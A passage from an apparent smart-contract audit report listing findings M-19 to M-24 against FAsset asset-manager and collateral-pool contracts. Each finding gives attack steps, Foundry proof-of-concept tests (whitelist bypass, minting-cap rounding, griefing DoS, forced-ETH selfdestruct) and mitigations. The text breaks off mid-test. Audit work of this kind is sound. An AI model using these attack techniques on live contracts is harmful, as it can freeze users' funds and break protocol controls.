Restrict setter to a dedicated role: add an onlyCleanupBlockNumberManager modifier (require(msg.sender == cleanupBlockNumberManager)) on setCleanupBlockNumber. Optionally also allow onlyAssetManager to call it, and sanity-bound inputs (e.g., <= current block).





 **Derived From** : call reverts if !Agents.isOwner(agent, msg.sender)

## [M-19]. Whitelist bypass: non‑whitelisted agent owners can pass selfMint gate due to AgentOwnerRegistry.isWhitelisted using msg.sender

## Derived From Pattern/Invariant
call reverts if !Agents.isOwner(agent, msg.sender)

## Exploit Type
AuthByPass

## Location
MintingFacet.selfMint

## Minimim Privilege Required
RequiresRole

## Description
selfMint requires Agents.requireWhitelistedAgentVaultOwner(agent), which calls Agents.requireWhitelisted(_agent.ownerManagementAddress) -> Globals.getAgentOwnerRegistry().isWhitelisted(_ownerManagementAddress). However, AgentOwnerRegistry.isWhitelisted(address) ignores the supplied argument and instead returns whitelist[msg.sender]. When invoked from AssetManager (MintingFacet), msg.sender is the AssetManager contract address, not the agent’s management address. If the registry ever whitelists the AssetManager (or any calling wrapper), the whitelist check always passes regardless of the agent’s actual whitelist status. This lets a revoked/non‑KYC agent owner continue to call selfMint/mintFromFreeUnderlying, defeating intended permissioning. Vulnerable snippet (slithir):

AgentOwnerRegistry.isWhitelisted(address) [PUBLIC]
  _address_1(address) := phi(['msg.sender'])
  whitelist[_address]
  RETURN whitelist[_address_1]

Effect: requireWhitelistedAgentVaultOwner() can be trivially satisfied by whitelisting the caller contract, not the agent’s management address.

## Impact
Due to AgentOwnerRegistry.isWhitelisted(address) ignoring its argument and returning whitelist[msg.sender], any whitelist checks performed from within the AssetManager (diamond) effectively verify the AssetManager’s own whitelist status rather than the target management address. If governance or the registry manager ever (mis)whitelists the AssetManager (or a wrapper contract used to route calls), then revoked or non‑KYC agent owners can still pass the whitelist gate and proceed with selfMint/mintFromFreeUnderlying (and any other entrypoint that relies on Agents.requireWhitelisted/requireWhitelistedAgentVaultOwner). This breaks intended permissioning/KYC controls and requires admin intervention to correct the registry state or upgrade the implementation.

## Proof of Concept
Precondition: The AgentOwnerRegistry has mistakenly whitelisted the AssetManager (diamond) address or another wrapper that calls the registry on behalf of the AssetManager.

Steps:
1) Deploy a registry that reproduces the current buggy behavior (isWhitelisted returns whitelist[msg.sender], ignoring the address parameter), or deploy the current AgentOwnerRegistry implementation exhibiting the same behavior.
2) In a harness, set Globals.getSettings().agentOwnerRegistry to that registry.
3) Do NOT whitelist the agent’s management address; instead, set whitelist[harness-or-AssetManager-address] = true in the registry.
4) Set an agent state with ownerManagementAddress = some non‑whitelisted address and invoke Agents.requireWhitelistedAgentVaultOwner(agent) from the harness. It succeeds because the registry checks whitelist[msg.sender] (the harness/AssetManager), not the ownerManagementAddress.
5) Consequently, selfMint/mintFromFreeUnderlying in MintingFacet would pass the whitelist gate under this misconfiguration, allowing non‑whitelisted agent owners to proceed.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {Globals} from "contracts/assetManager/library/Globals.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {Agents} from "contracts/assetManager/library/Agents.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";

// Minimal buggy registry reproducing the observed behavior
contract BuggyRegistry {
    mapping(address => bool) public whitelist;
    function set(address a, bool v) external { whitelist[a] = v; }
    // Ignores the input, returns whitelist[msg.sender]
    function isWhitelisted(address) external view returns (bool) { return whitelist[msg.sender]; }
    // Optional helpers to resemble interface
    function getWorkAddress(address) external view returns (address) { return address(0); }
}

// Harness to exercise Agents.requireWhitelistedAgentVaultOwner
contract WhitelistBypassHarness {
    using Agents for Agent.State;
    Agent.State private agent;

    function setRegistry(address reg) external {
        AssetManagerSettings.Data storage s = Globals.getSettings();
        s.agentOwnerRegistry = reg;
    }
    function setAgentMgmt(address mgmt) external { agent.ownerManagementAddress = mgmt; }
    function checkWhitelistedGate() external { Agents.requireWhitelistedAgentVaultOwner(agent); }
}

contract WhitelistBypassTest is Test {
    WhitelistBypassHarness harness;
    BuggyRegistry registry;
    address mgmt = address(0xBEEF);

    function setUp() public {
        harness = new WhitelistBypassHarness();
        registry = new BuggyRegistry();
        harness.setRegistry(address(registry));
        harness.setAgentMgmt(mgmt);
    }

    function test_BypassWhitelist_UsingMsgSender() public {
        // Management address is NOT whitelisted
        // registry.set(mgmt, false);

        // Whitelist the CALLER (harness/AssetManager) instead
        registry.set(address(harness), true);

        // Should NOT revert, even though mgmt is not whitelisted
        harness.checkWhitelistedGate();

        // Now remove caller whitelist, gate must revert
        registry.set(address(harness), false);
        vm.expectRevert();
        harness.checkWhitelistedGate();
    }
}


## Suggested Mitigation
Fix AgentOwnerRegistry.isWhitelisted(address _address) to return whitelist[_address] instead of whitelist[msg.sender]. Add unit tests that: (a) verify isWhitelisted uses its argument; (b) ensure AssetManager’s selfMint and mintFromFreeUnderlying revert when the agent’s management address is not whitelisted; and (c) specifically assert that whitelisting the AssetManager address alone does not pass the gate for a non‑whitelisted owner. Optionally, add a configuration safeguard in governance tooling to prevent whitelisting the AssetManager (diamond) address or known router addresses.





 **Derived From** : Let settings = Globals.getSettings(). If settings.mintingCapAMG > 0 then post(AssetManagerState.get().totalReservedCollateralAMG) + Conversion.convertUBAToAmg(IERC20(settings.fAsset).totalSupply()) <= settings.mintingCapAMG

## [M-20]. Global minting cap can be exceeded due to floor rounding of pool-fee AMG in reserveCollateral

## Derived From Pattern/Invariant
Let settings = Globals.getSettings(). If settings.mintingCapAMG > 0 then post(AssetManagerState.get().totalReservedCollateralAMG) + Conversion.convertUBAToAmg(IERC20(settings.fAsset).totalSupply()) <= settings.mintingCapAMG

## Exploit Type
RoundingError

## Location
CollateralReservationsFacet.reserveCollateral

## Minimim Privilege Required
Permissionless

## Description
reserveCollateral reserves AMG as valueAMG + _currentPoolFeeAMG(agent, valueAMG). _currentPoolFeeAMG computes poolFeeUBA = Minting.calculateCurrentPoolFeeUBA(...) and then rounds down to AMG via Conversion.convertUBAToAmg(poolFeeUBA). Minting.checkMintingCap is then called with this floored _reservationAMG. Because poolFeeUBA is often < assetMintingGranularityUBA per reservation (e.g., small lots, typical agent fee × pool share), convertUBAToAmg(poolFeeUBA) becomes 0, so the reservation ignores the pool fee in the cap check. Repeating many small reservations accumulates uncounted pool-fee AMG while still passing the cap check. The cap check also floors minted UBA to AMG (Conversion.convertUBAToAmg(totalSupply)), which undercounts minted supply by up to <1 AMG; combined with per-reservation fee rounding, the system can accept reservations whose eventual minted+fee (in AMG) exceeds mintingCapAMG by roughly valueAMG × (agentFeeBIPS × poolFeeShareBIPS / 1e8) across outstanding reservations. Vulnerable snippet:

CollateralReservationsFacet.reserveCollateral:
  _reserveCollateral(agent, valueAMG + _currentPoolFeeAMG(agent, valueAMG));

CollateralReservationsFacet._currentPoolFeeAMG:
  uint256 poolFeeUBA = Minting.calculateCurrentPoolFeeUBA(_agent, underlyingValueUBA);
  return Conversion.convertUBAToAmg(poolFeeUBA); // floor division

Minting.checkMintingCap:
  uint256 totalMintedUBA = IERC20(settings.fAsset).totalSupply();
  uint64 totalAMG = state.totalReservedCollateralAMG + Conversion.convertUBAToAmg(totalMintedUBA);
  require(totalAMG + _increaseAMG <= mintingCapAMG, MintingCapExceeded());

## Impact
Because reserveCollateral accounts the pool fee in AMG using floor rounding, many small reservations can pass the global cap check even though their eventual mint (including pool-fee FAssets) will push totalSupply above governance’s mintingCapAMG. This breaks the cap invariant and can overshoot by roughly valueAMG × (agentFeeBIPS × poolFeeShareBIPS / 1e8) across the allowed batch, not just <1 AMG. Once these mints are executed, future reservations get blocked (since minted supply alone exceeds the cap), creating a temporary system-wide DoS on new minting until redemptions reduce supply. No funds are directly stolen, but issuance policy is violated and minting can be unintentionally halted.

## Proof of Concept
Setup (e.g., XRP params): assetMintingGranularityUBA=1e6, lotSizeAMG=10, agentFee=10% (1000 bips), poolFeeShare=30% (3000 bips). For one lot, poolFeeUBA = 10 AMG × 10% × 30% = 0.3 AMG (in UBA). CollateralReservationsFacet._currentPoolFeeAMG converts poolFeeUBA to AMG via floor, resulting in 0. Thus each reservation increases cap usage by 10 AMG instead of 10.3 AMG. An attacker (or honest users) performs C/10 reservations where C is mintingCapAMG (e.g., C=750,000 AMG → 75,000 reservations). All reservations pass since the pool-fee is ignored in the cap check. After executors finalize these mints, totalSupply increases by 10.3 AMG per reservation (10 to minter + 0.3 to pool), i.e., 772,500 AMG in total, which exceeds the 750,000 AMG cap by ~3%. The cap is violated ex post, and further reservations will revert while the system sits above the cap until redemptions occur.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "contracts/assetManager/library/Globals.sol";
import "contracts/assetManager/library/data/AssetManagerState.sol";
import "contracts/assetManager/library/Minting.sol";
import "contracts/assetManager/library/Conversion.sol";
import "contracts/utils/library/SafePct.sol";

// Minimal fAsset mock: only totalSupply() is needed by Minting.checkMintingCap
contract MockFAsset {
    uint256 private _supply;
    function setSupply(uint256 s) external { _supply = s; }
    function totalSupply() external view returns (uint256) { return _supply; }
}

contract MintingCapPoolFeeRoundingTest is Test {
    using SafePct for uint256;

    function test_capBypassViaPoolFeeFlooring() public {
        // Configure settings
        AssetManagerSettings.Data storage settings = Globals.getSettings();
        settings.mintingCapAMG = uint64(100);              // small cap for clarity
        settings.assetMintingGranularityUBA = uint64(1e6); // 1 AMG = 1e6 UBA

        // Install mock fAsset
        MockFAsset fasset = new MockFAsset();
        settings.fAsset = address(fasset);

        // Zero reserved at start
        AssetManagerState.State storage state = AssetManagerState.get();
        state.totalReservedCollateralAMG = 0;

        // Parameters resembling: lot=10 AMG, agent fee=10%, pool share=30%
        uint64 lotAmg = 10;
        uint256 lotUBA = Conversion.convertAmgToUBA(lotAmg);            // = 10e6
        uint16 agentFeeBIPS = 1000;                                     // 10%
        uint16 poolFeeShareBIPS = 3000;                                 // 30%
        // Exact pool fee in UBA per reservation
        uint256 mintFeeUBA = SafePct.mulBips(lotUBA, agentFeeBIPS);     // 10% of lotUBA
        uint256 poolFeeUBA = SafePct.mulBips(mintFeeUBA, poolFeeShareBIPS); // 30% of mint fee
        // Convert fee to AMG as contract does (floor)
        uint64 poolFeeAmgFloored = Conversion.convertUBAToAmg(poolFeeUBA);
        assertEq(poolFeeAmgFloored, 0, "pool fee floors to 0 AMG per reservation");

        // Fill the cap using measured increases (valueAMG + floor(poolFeeAMG) == 10 + 0)
        uint64 measuredIncrease = lotAmg + poolFeeAmgFloored;           // = 10
        uint64 loops = settings.mintingCapAMG / lotAmg;                  // 100/10 = 10
        for (uint256 i = 0; i < loops; i++) {
            // This emulates CollateralReservationsFacet._reserveCollateral -> Minting.checkMintingCap
            Minting.checkMintingCap(measuredIncrease);                  // must not revert during reservations
            state.totalReservedCollateralAMG += measuredIncrease;        // emulate reservation accounting
        }
        // Measured reserved hits cap exactly
        assertEq(state.totalReservedCollateralAMG, settings.mintingCapAMG, "measured reservations reach cap");

        // Now simulate that all reservations are executed (minted):
        // totalSupply increases by (lotUBA + poolFeeUBA) per reservation
        uint256 mintedTotalUBA = uint256(loops) * (lotUBA + poolFeeUBA);
        fasset.setSupply(mintedTotalUBA);

        // After execution, reservations are released in the real system; emulate by zeroing reserved
        state.totalReservedCollateralAMG = 0;

        // Since totalSupply now exceeds the cap when converted to AMG, any further reservation should revert
        // Minting.checkMintingCap(0) already fails because minted supply alone is above mintingCapAMG
        vm.expectRevert(abi.encodeWithSignature("MintingCapExceeded()"));
        Minting.checkMintingCap(0);

        // Sanity: minted supply in AMG (floored) is loops * (10 AMG + 0.3 AMG) = 103 AMG (> 100)
        uint64 mintedAmgFloored = Conversion.convertUBAToAmg(mintedTotalUBA);
        assertEq(mintedAmgFloored, 103, "post-mint supply exceeds cap due to previously ignored pool fees");
    }
}


## Suggested Mitigation
Eliminate per-reservation floor loss when enforcing the cap. Recommended options:
- Enforce the cap in UBA, not AMG: require(state.totalReservedCollateralUBA + totalSupplyUBA + newReservationUBAIncludingExactPoolFeeUBA <= mintingCapAMG * assetMintingGranularityUBA). This removes truncation entirely.
- If you must keep cap in AMG, compute the per-reservation increase using ceil on UBA, e.g., increaseAMG = ceilDiv(valueUBA + poolFeeUBA, assetMintingGranularityUBA), or equivalently add 1 AMG whenever poolFeeUBA % granularity != 0. Implement a convertUBAToAmgCeil helper to avoid scattered ceil code.
- Alternatively, accumulate a system-wide “rounding dust” counter for ignored UBA remainders and periodically add +1 AMG to reservations once dust ≥ 1 AMG; include this dust in checkMintingCap.
Any of the above ensures that many small reservations cannot bypass the minting cap by repeatedly zeroing sub‑AMG pool fees.





 **Derived From** : post.totalCollateral == 0 && post.wNat.balanceOf(address(this)) == 0

## [M-21]. Permissionless pool entry DoS prevents CollateralPool.destroy from ever reaching zero-balance post-state

## Derived From Pattern/Invariant
post.totalCollateral == 0 && post.wNat.balanceOf(address(this)) == 0

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.destroy

## Minimim Privilege Required
Permissionless

## Description
CollateralPool.destroy is only callable when the pool token totalSupply is zero (per implementation intent: "Destroys pool when no tokens exist; sends leftovers"). However, enter() is permissionless and can be called at any time, including right before or during an agent’s destruction flow. An attacker can front‑run or repeatedly grief by sending the minimum NAT to enter() to mint any positive amount of CPTs, ensuring totalSupply > 0. This permanently blocks destroy(), leaving totalCollateral and the pool’s WNat balance non‑zero, violating the intended post‑state invariant. Because the pool cannot forcibly burn third‑party CPTs, the agent and governance cannot reach the destroy post-state without out‑of‑band intervention or a code upgrade. Vulnerable snippet (semantic):
- CollateralPool.destroy(): require(token.totalSupply() == 0) to proceed with sweeping WNat and zeroing accounting.
- CollateralPool.enter(): external payable nonReentrant; permissionless mint of CPTs, increasing totalSupply.
No guard exists to disable enter() after destroy is announced or while the agent is DESTROYING.

## Impact
A permissionless actor can indefinitely block an agent’s destruction by minting any positive amount of CPT via enter(), keeping totalSupply > 0. This prevents CollateralPool.destroy() from executing and leaves remaining WNat collateral (including rounding leftovers or any residual pool funds) trapped until the attacker exits or a governance upgrade/state repair is performed.

## Proof of Concept
Attack outline:
1) Agent announces or prepares destruction. The system expects CollateralPool.destroy() to run and sweep residual WNat.
2) Attacker front‑runs or simply calls enter() with the minimum NAT just before destroyAgent(), minting any positive amount of CPT.
3) totalSupply > 0 causes CollateralPool.destroy() to revert due to its zero-supply precondition.
4) The attacker can keep a small CPT balance indefinitely (or re-enter later), keeping the pool non-destroyable and freezing any residual WNat in the pool.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";

// Minimal mock token with non-zero totalSupply to simulate a CPT holder.
contract MockToken {
    function totalSupply() external pure returns (uint256) { return 1; }
}

contract CollateralPoolDestroyDoSTest is Test {
    CollateralPool pool;
    MockToken mockToken;
    address agentVault = address(0xA11CE);
    address payable recipient = payable(address(0xBEEF));

    function setUp() public {
        // Test-only constructor exists; pass this test as assetManager so onlyAssetManager checks pass.
        pool = new CollateralPool(agentVault, address(this), address(0xFABCDE), 16000);
        mockToken = new MockToken();
        // Set pool token to a contract that reports totalSupply() > 0
        pool.setPoolToken(address(mockToken));
    }

    function test_DestroyBlockedByNonZeroSupply() public {
        // With totalSupply() > 0, destroy() must not succeed
        vm.expectRevert();
        pool.destroy(recipient);
    }
}


## Suggested Mitigation
Introduce a two-phase pool closure and forced-settlement mechanism:
- Phase 1 (Lock): When the agent announces destroy, the AssetManager locks the pool (enter() and any action that can increase totalSupply are disabled). Existing holders can still exit/transfer per current rules.
- Phase 2 (Close): After a grace window, enable a claim-style forced settlement that lets any CPT holder burn their tokens (ignoring timelocks) to claim their pro‑rata WNat; do not require the pool to enumerate holders. Implement this as: token.burn(holderBalance, ignoreTimelocked=true) callable by holder, which pulls pro‑rata WNat from the pool to the holder.
- Allow CollateralPool.destroy() to proceed once the pool is locked and the forced-settlement window has elapsed, even if residual dust remains, by moving remaining WNat into an escrow/cleaner contract where late holders can still self-claim against burning their CPTs. This removes the zero-supply hard gate, eliminates the griefing vector, and preserves holder redeemability without giving the agent the power to seize third-party balances.
Additionally, add a guard in enter() that reverts if the agent status is DESTROYING (checked via AssetManager), and provide an AssetManager-only function to lock pool entries immediately upon announceDestroyAgent().





 **Derived From** : Non‑agent withdrawal confirmation can be DoS’d by reward payout revert

## [M-22]. confirmUnderlyingWithdrawal can be DoS’d when AgentPayout/IIAgentVault.payout reverts, blocking third‑party confirmations

## Derived From Pattern/Invariant
Non‑agent withdrawal confirmation can be DoS’d by reward payout revert

## Exploit Type
Dos

## Location
UnderlyingBalanceFacet.confirmUnderlyingWithdrawal

## Minimim Privilege Required
Permissionless

## Description
When a non‑agent calls confirmUnderlyingWithdrawal, the function unconditionally pays a reward from the agent’s vault: if (!isAgent) { AgentPayout.payForConfirmationByOthers(agent, msg.sender); }. AgentPayout.payoutFromVault then does an external call: vault.payout(collateral.token, _receiver, _amountPaid) without try/catch. Any revert in vault.payout or the ERC20 transfer (blacklist, pause, non‑standard token, etc.) reverts the whole confirmation. This griefable callback couples liveness of the core confirmation flow to an untrusted external payout. Result: after timeout, third parties cannot confirm withdrawals (intended liveness: “anyone can confirm”), keeping the announcement active until the agent intervenes. Vulnerable snippets:

UnderlyingBalanceFacet.confirmUnderlyingWithdrawal(...)
  ...
  agent.announcedUnderlyingWithdrawalId = 0;
  UnderlyingBalance.updateBalance(...);
  if (!isAgent) {
      AgentPayout.payForConfirmationByOthers(agent, msg.sender); // external payout required
  }
  ...

AgentPayout.payoutFromVault(...)
  _amountPaid = Math.min(_amountWei, collateral.token.balanceOf(vault));
  vault.payout(collateral.token, _receiver, _amountPaid); // external call; no try/catch

## Impact
Third‑party confirmations after timeout can be permanently/indefinitely blocked if the vault payout or collateral token transfer reverts. The announcement remains active (agent can’t announce a new one) and the “anyone can confirm” liveness property is broken until the agent (privileged) confirms or governance/state repair occurs.

## Proof of Concept
- Agent announces underlying withdrawal, time passes so others can confirm.
- Collateral token or vault payout path is in a state where transfers revert for any receiver (e.g., token paused/freezed or non‑standard behavior), or simply for the current confirmer.
- A non‑agent EOA (executor/bot) calls confirmUnderlyingWithdrawal with a valid proof. The function reaches AgentPayout.payoutFromVault -> vault.payout(...), which reverts.
- The whole transaction reverts, so no one (non‑agent) can confirm; the announcement stays active and the agent cannot re‑announce a new withdrawal. Only an agent call (no payout) or admin repair can restore progress.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

interface IAgentVaultLike {
    function payout(address token, address recipient, uint256 amount) external;
}

// Malicious/broken vault that always reverts on payout
contract RevertingVault is IAgentVaultLike {
    function payout(address, address, uint256) external pure {
        revert("payout-revert");
    }
}

// Minimal harness that models the griefable pattern: state update then mandatory external payout for non-agent
contract ConfirmHarness is Test {
    IAgentVaultLike public immutable vault;
    address public immutable agent;
    bool public announcedActive; // models agent.announcedUnderlyingWithdrawalId != 0

    event Confirmed(address caller, bool isAgent);

    constructor(IAgentVaultLike _vault, address _agent) {
        vault = _vault;
        agent = _agent;
        announcedActive = true;
    }

    // Simulates UnderlyingBalanceFacet.confirmUnderlyingWithdrawal core flow
    function confirm(bool isAgent) external {
        require(announcedActive, "NoActiveAnnouncement");
        // clear announcement & update accounting (modeled)
        announcedActive = false;
        // griefable callback: required payout for non-agent callers
        if (!isAgent) {
            vault.payout(address(0xDEAD), msg.sender, 1); // will revert in RevertingVault
        }
        emit Confirmed(msg.sender, isAgent);
    }
}

contract GriefableCallbacksTest is Test {
    RevertingVault vault;
    ConfirmHarness harness;
    address agent = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        vault = new RevertingVault();
        harness = new ConfirmHarness(IAgentVaultLike(address(vault)), agent);
    }

    function test_NonAgentConfirmIsDoSedByPayoutRevert() public {
        // Non-agent tries to confirm -> vault payout reverts -> whole confirmation reverts
        vm.prank(attacker);
        vm.expectRevert(bytes("payout-revert"));
        harness.confirm(false);
        // Announcement still active (revert rolled back state), proving DoS for 3rd parties
        assertEq(harness.announcedActive(), true);

        // Agent (owner) can confirm because no payout is attempted for agent callers
        vm.prank(agent);
        harness.confirm(true);
        assertEq(harness.announcedActive(), false);
    }
}


## Suggested Mitigation
Make confirmation liveness independent of reward transfer by ensuring payout failures do not revert confirmUnderlyingWithdrawal. Concretely: (A) Change AgentPayout to swallow payout errors. For example, in AgentPayout.payoutFromVault wrap the external call in try/catch or a low-level call and ignore failure while optionally emitting PayoutFailed(agent.vaultAddress(), receiver, amountWei):

function payoutFromVault(Agent.State storage _agent, address _receiver, uint256 _amountWei) internal returns (uint256 _amountPaid) {
    CollateralTypeInt.Data storage collateral = Agents.getVaultCollateral(_agent);
    IIAgentVault vault = IIAgentVault(_agent.vaultAddress());
    uint256 bal = collateral.token.balanceOf(address(vault));
    _amountPaid = Math.min(_amountWei, bal);
    if (_amountPaid == 0) return 0;
    try vault.payout(collateral.token, _receiver, _amountPaid) { } catch { _amountPaid = 0; /* emit PayoutFailed */ }
}

This way confirmUnderlyingWithdrawal never reverts due to payout. (B) Preferably, decouple with a pull-claim: record owed reward (in AssetManagerState or per-agent state) and let the confirmer claim from the vault (or protocol escrow) via a separate function using SafeERC20 and robust token handling. Either approach must ensure the confirmation path does not revert when token is paused/blacklists or vault.payout fails.





 **Derived From** : address(this).balance == 0 && internalWithdrawal == false

## [M-23]. Forced native token (ETH/FLR) can brick CollateralPool operations by leaving nonzero balance via selfdestruct

## Derived From Pattern/Invariant
address(this).balance == 0 && internalWithdrawal == false

## Exploit Type
UnexpectedEth

## Location
CollateralPool.depositNat (representative; same post-condition used by exit/exitTo, selfCloseExit/selfCloseExitTo, payout, destroy)

## Minimim Privilege Required
Permissionless

## Description
CollateralPool relies on a strict post-condition that, after NAT unwrap/send flows, internalWithdrawal is reset and the contract’s native balance is zero. However, receive() cannot prevent native tokens being force-sent via selfdestruct, which bypasses receive() entirely. If an attacker force-sends 1 wei to the pool, any subsequent call that enforces the zero-balance invariant at the end (exit/exitTo, selfCloseExit/selfCloseExitTo, payout, depositNat, destroy) will revert, creating a permissionless DoS. Vulnerable pattern (simplified):

- receive() external payable { require(internalWithdrawal); }
- ... after flow: internalWithdrawal = false; require(address(this).balance == 0, "no stray NAT");

Since selfdestruct transfers cannot be blocked, the invariant is unachievable whenever an attacker preloads the pool with 1 wei. This bricks key pool flows until governance/admin intervenes.

## Impact
A griefing attacker can force-send native tokens (via selfdestruct) to the CollateralPool, leaving a nonzero native balance. Any subsequent function that unwraps WNat and sends NAT and then enforces a post-condition like require(address(this).balance == 0) (e.g., exit/exitTo, selfCloseExit/To, payout when paying in NAT, and destroy) will revert due to the preloaded dust. This creates a permissionless, repeatable DoS on those flows until an admin sweeps or upgrades. Note: depositNat() typically wraps the entire native balance and is not bricked; the issue concerns unwrap/send paths that assert zero post-balance.

## Proof of Concept
1) Attacker force-sends 1 wei to the pool using a contract that selfdestructs to the pool address.
2) A pool flow that unwraps and sends NAT (e.g., destroy() when token supply is zero; or exit/exitTo/selfCloseExit/To) executes:
   - internalWithdrawal := true; WNat.withdraw(amount);
   - send NAT to recipient
   - internalWithdrawal := false; require(address(this).balance == 0)
3) Because 1 wei was preloaded, the require(address(this).balance == 0) check fails and the transaction reverts, DoSing that operation. The attacker can repeat this at will.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";

interface IWNat {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MockWNat is IWNat {
    string public name = "MockWNat";
    string public symbol = "mWFLR";
    uint8 public decimals = 18;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function deposit() external payable override { balanceOf[msg.sender] += msg.value; }
    function withdraw(uint256 amount) external override {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "send");
    }
    function transfer(address to, uint256 amount) external override returns (bool){
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true;
    }
    function approve(address spender, uint256 amount) external override returns (bool){ allowance[msg.sender][spender] = amount; return true; }
    receive() external payable {}
}

contract ForceSend { receive() external payable {} function boom(address payable target) external { selfdestruct(target); } }

contract CollateralPool_ForcedEth_DoS_Destroy_Test is Test {
    CollateralPool pool;
    MockWNat wnat;
    CollateralPoolToken token;

    function setUp() public {
        wnat = new MockWNat();
        // Test-only constructor wires assetManager to this contract
        pool = new CollateralPool(address(0xA), address(this), address(0xFAS), uint32(16000));
        // Set WNat impl (onlyAssetManager)
        pool.upgradeWNatContract(IWNat(address(wnat)));
        // Install a pool token (supply remains zero)
        token = new CollateralPoolToken(address(pool), "FCPT-SYS-AGT", "FCPT-SYS-AGT");
        pool.setPoolToken(address(token));
        // Seed pool with WNat so destroy() has something to unwrap and send
        pool.depositNat{value: 1 ether}();
        assertEq(address(pool).balance, 0, "no NAT after deposit");
    }

    function test_DoS_on_destroy_by_ForcedETH() public {
        // Attacker force-sends 1 wei to pool via selfdestruct
        ForceSend bomber = new ForceSend();
        vm.deal(address(bomber), 1);
        bomber.boom(payable(address(pool)));
        assertEq(address(pool).balance, 1, "stray native must be present");

        // With nonzero native balance, destroy() (unwraps + sends) will revert on post-balance==0 invariant
        vm.expectRevert();
        pool.destroy(payable(address(0xBEEF)));

        // Dust persists (repeatable grief)
        assertEq(address(pool).balance, 1, "stray native persists");
    }
}


## Suggested Mitigation
Do not hard-require address(this).balance == 0 at the end of unwrap/send flows without sweeping forced ETH. Before and/or after any WNat.withdraw-and-send path, unconditionally sweep unexpected native balance into WNat: if (address(this).balance > 0) { wNat.deposit{value: address(this).balance}(); /* update accounting */ }. Then clear internalWithdrawal and proceed without a strict post-condition, or require zero only after the sweep. Additionally, expose an admin- or public sweepNative() that wraps all stray native into WNat and updates accounting. This removes the permissionless DoS vector while preserving the original invariant intent.





 **Derived From** : After call: agent.poolCollateralIndex == AssetManagerState.get().poolCollateralIndex AND Agents.getPoolWNat(agent) == IWNat(address(AssetManagerState.get().collateralTokens[AssetManagerState.get().poolCollateralIndex].token)).

## [M-24]. Agent can bypass stricter pool min-CR after WNat rotation by not calling upgradeWNatContract

## Derived From Pattern/Invariant
After call: agent.poolCollateralIndex == AssetManagerState.get().poolCollateralIndex AND Agents.getPoolWNat(agent) == IWNat(address(AssetManagerState.get().collateralTokens[AssetManagerState.get().poolCollateralIndex].token)).

## Exploit Type
UpgradeabilityInitializerSafety

## Location
AgentCollateralFacet.upgradeWNatContract

## Minimim Privilege Required
RequiresRole

## Description
Governance rotates the system pool WNat (state.poolCollateralIndex -> new CollateralTypeInt.Data with higher minCollateralRatioBIPS). The design relies on each agent owner to call AgentCollateralFacet.upgradeWNatContract() to sync agent.poolCollateralIndex and migrate the pool’s WNat. If an (untrusted) agent does not call it, their agent.poolCollateralIndex keeps pointing to the old pool collateral type, so all CR checks that read min/safety CR from Agents.getPoolCollateral() continue using the old (lower) ratios. This breaks the referential invariant that agent pool collateral configuration is synchronized to the system-wide pool WNat type after upgrade and lets the agent continue minting/operating under deprecated, more permissive thresholds.

Vulnerable snippet (reliance on manual sync):

function upgradeWNatContract(address _agentVault) external onlyAgentVaultOwner(_agentVault) {
    Agent.State storage agent = Agent.get(_agentVault);
    AssetManagerState.State storage state = AssetManagerState.get();
    IWNat wNat = IWNat(address(state.collateralTokens[state.poolCollateralIndex].token));
    if (agent.poolCollateralIndex != state.poolCollateralIndex) {
        agent.poolCollateralIndex = state.poolCollateralIndex; // manual sync required
        agent.collateralPool.upgradeWNatContract(wNat);
        emit IAssetManagerEvents.AgentCollateralTypeChanged(...);
    }
}

Downstream CR checks (read old index if unsynced):
- AgentCollateral.mintingMinCollateralRatio(..., Collateral.Kind.POOL) → _agent.getPoolCollateral().minCollateralRatioBIPS
- Liquidation._targetRatioBIPS(..., Collateral.Kind.POOL) → _agent.getCollateral(...).{min,safety}MinCollateralRatioBIPS

Impact: an agent can keep operating with lower min CR than mandated by governance, enabling excessive mint capacity and delayed/liquidation threshold changes. This creates systemic under-collateralization risk until governance performs out-of-band intervention.

## Impact
Agent avoids stricter pool collateral ratios after a WNat upgrade, allowing minting and CR enforcement under outdated parameters; risk of under-collateralization and mint capacity beyond governance limits until manual repair.

## Proof of Concept
1) Governance rotates pool WNat to a new token and sets higher minCollateralRatioBIPS on the new CollateralTypeInt entry; state.poolCollateralIndex points to the new entry.
2) The agent does not call upgradeWNatContract().
3) Mints and CR checks for this agent read _agent.getPoolCollateral().minCollateralRatioBIPS (from agent.poolCollateralIndex), which still points to the old entry with lower minCR.
4) The agent (or minters via this agent) can mint amounts that would violate the new minCR but pass under the old minCR, creating systemic under-collateralization risk.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AssetManagerState} from "contracts/assetManager/library/data/AssetManagerState.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";
import {Collateral} from "contracts/assetManager/library/data/Collateral.sol";
import {CollateralType} from "contracts/userInterfaces/data/CollateralType.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";
import {AgentCollateral} from "contracts/assetManager/library/AgentCollateral.sol";

contract UnsyncedPoolIndexTest is Test {
    using AssetManagerState for AssetManagerState.State;

    function test_BypassPoolMinCRByNotUpgradingWNat() public {
